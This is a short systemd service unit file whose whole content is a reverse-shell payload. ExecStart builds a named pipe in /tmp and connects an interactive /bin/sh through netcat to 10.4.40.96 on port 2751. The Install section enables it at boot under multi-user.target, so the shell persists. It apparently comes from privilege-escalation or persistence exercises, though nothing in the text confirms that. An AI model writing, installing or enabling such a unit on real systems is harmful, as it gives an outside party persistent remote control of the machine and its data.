[Service]
ExecStart=/bin/bash -c "rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.40.96 2751 >/tmp/f"
[Install]
WantedBy=multi-user.target
